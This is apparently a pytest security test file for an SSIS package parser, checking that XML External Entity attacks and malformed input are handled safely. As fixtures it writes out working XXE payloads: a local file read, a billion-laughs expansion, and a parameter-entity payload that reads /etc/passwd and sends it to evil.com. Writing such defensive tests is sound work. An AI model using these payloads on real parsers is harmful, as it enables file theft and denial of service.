"""Security tests for SSIS parser - XXE prevention and input validation."""

import os
import tempfile

import pytest
from lxml import etree

from src.parser.ssis_parser import SSISParser


class TestXXEPrevention:
    """Tests to verify XXE (XML External Entity) attacks are prevented."""

    @pytest.fixture
    def parser(self):
        """Create a fresh parser instance."""
        return SSISParser()

    @pytest.fixture
    def temp_dir(self):
        """Create a temporary directory for test files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir

    def test_external_entity_file_read_blocked(self, parser, temp_dir):
        """Should block attempts to read local files via XXE."""
        # Create a sensitive file that an attacker might try to read
        secret_file = os.path.join(temp_dir, "secret.txt")
        with open(secret_file, "w") as f:
            f.write("SENSITIVE_DATA_12345")

        # Create malicious SSIS package with XXE payload
        malicious_xml = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{secret_file}">
]>
<DTS:Executable xmlns:DTS="www.microsoft.com/SqlServer/Dts">
  <DTS:Property DTS:Name="PackageName">&xxe;</DTS:Property>
</DTS:Executable>'''

        dtsx_file = os.path.join(temp_dir, "malicious.dtsx")
        with open(dtsx_file, "w") as f:
            f.write(malicious_xml)

        # Parse should succeed but NOT include the secret file contents
        package = parser.parse_package(dtsx_file)

        # The XXE should be blocked - entity should not be resolved
        assert "SENSITIVE_DATA_12345" not in package.name
        assert "SENSITIVE_DATA_12345" not in str(package.model_dump())

    def test_external_entity_url_fetch_blocked(self, parser, temp_dir):
        """Should block attempts to fetch external URLs via XXE."""
        # Create malicious SSIS package attempting URL fetch
        malicious_xml = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/steal-data">
]>
<DTS:Executable xmlns:DTS="www.microsoft.com/SqlServer/Dts">
  <DTS:Property DTS:Name="PackageName">&xxe;</DTS:Property>
</DTS:Executable>'''

        dtsx_file = os.path.join(temp_dir, "url_xxe.dtsx")
        with open(dtsx_file, "w") as f:
            f.write(malicious_xml)

        # Should parse without making network requests
        # (no_network=True in parser configuration)
        package = parser.parse_package(dtsx_file)

        # Entity should not be resolved
        assert package is not None

    def test_billion_laughs_attack_blocked(self, parser, temp_dir):
        """Should block exponential entity expansion (billion laughs attack)."""
        # This attack tries to consume memory via recursive entity expansion
        malicious_xml = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<DTS:Executable xmlns:DTS="www.microsoft.com/SqlServer/Dts">
  <DTS:Property DTS:Name="PackageName">&lol4;</DTS:Property>
</DTS:Executable>'''

        dtsx_file = os.path.join(temp_dir, "billion_laughs.dtsx")
        with open(dtsx_file, "w") as f:
            f.write(malicious_xml)

        # Should handle safely without memory exhaustion
        # With resolve_entities=False, entities won't expand
        package = parser.parse_package(dtsx_file)
        assert package is not None

    def test_parameter_entity_blocked(self, parser, temp_dir):
        """Should block parameter entity attacks."""
        malicious_xml = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://evil.com/?data=%file;'>">
  %eval;
]>
<DTS:Executable xmlns:DTS="www.microsoft.com/SqlServer/Dts">
  <DTS:Property DTS:Name="PackageName">test</DTS:Property>
</DTS:Executable>'''

        dtsx_file = os.path.join(temp_dir, "param_entity.dtsx")
        with open(dtsx_file, "w") as f:
            f.write(malicious_xml)

        # Should raise an error because parameter entities are blocked
        # This is the expected secure behavior - blocking the attack with an error
        with pytest.raises(etree.XMLSyntaxError):
            parser.parse_package(dtsx_file)


class TestSecureParserConfiguration:
    """Tests to verify secure parser settings."""

    @pytest.fixture
    def temp_dir(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir

    def test_parser_has_secure_settings(self, temp_dir):
        """Verify the parser uses secure XML configuration by testing behavior."""
        from src.parser.ssis_parser import _create_secure_parser

        # Access the secure parser factory function
        secure_parser = _create_secure_parser()

        # Verify security by testing that entities are NOT resolved
        # Create XML with an entity that should NOT be expanded
        test_xml = os.path.join(temp_dir, "entity_test.xml")
        with open(test_xml, "w") as f:
            f.write('''<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY testent "EXPANDED">]>
<root>&testent;</root>''')

        # Parse with secure parser - entity should NOT be expanded
        tree = etree.parse(test_xml, parser=secure_parser)
        root_text = tree.getroot().text or ""

        # If resolve_entities=False is working, the entity won't be expanded
        # The text will be empty or contain the entity reference, not "EXPANDED"
        assert "EXPANDED" not in root_text

    def test_create_secure_parser_function_exists(self):
        """Verify _create_secure_parser function exists and returns XMLParser."""
        from src.parser.ssis_parser import _create_secure_parser

        secure_parser = _create_secure_parser()
        assert isinstance(secure_parser, etree.XMLParser)


class TestInputValidation:
    """Tests for input validation in parser."""

    @pytest.fixture
    def parser(self):
        return SSISParser()

    @pytest.fixture
    def temp_dir(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            yield tmpdir

    def test_handles_non_xml_file(self, parser, temp_dir):
        """Should handle non-XML files gracefully."""
        bad_file = os.path.join(temp_dir, "not_xml.dtsx")
        with open(bad_file, "w") as f:
            f.write("This is not XML content!")

        # Should not crash - either returns None or raises descriptive error
        try:
            result = parser.parse_package(bad_file)
            # If it returns, should indicate parsing issue
        except Exception as e:
            # Should be a descriptive error, not a crash
            assert "xml" in str(e).lower() or "parse" in str(e).lower()

    def test_handles_empty_file(self, parser, temp_dir):
        """Should handle empty files gracefully."""
        empty_file = os.path.join(temp_dir, "empty.dtsx")
        with open(empty_file, "w") as f:
            f.write("")

        try:
            result = parser.parse_package(empty_file)
        except Exception as e:
            # Should get descriptive error
            assert e is not None

    def test_handles_missing_file(self, parser):
        """Should handle missing files gracefully."""
        with pytest.raises(Exception):
            parser.parse_package("/nonexistent/path/file.dtsx")

    def test_handles_malformed_xml(self, parser, temp_dir):
        """Should handle malformed XML gracefully."""
        bad_xml = os.path.join(temp_dir, "malformed.dtsx")
        with open(bad_xml, "w") as f:
            f.write("<unclosed_tag>")

        try:
            result = parser.parse_package(bad_xml)
        except Exception as e:
            # Should be XML parsing error, not crash
            assert e is not None
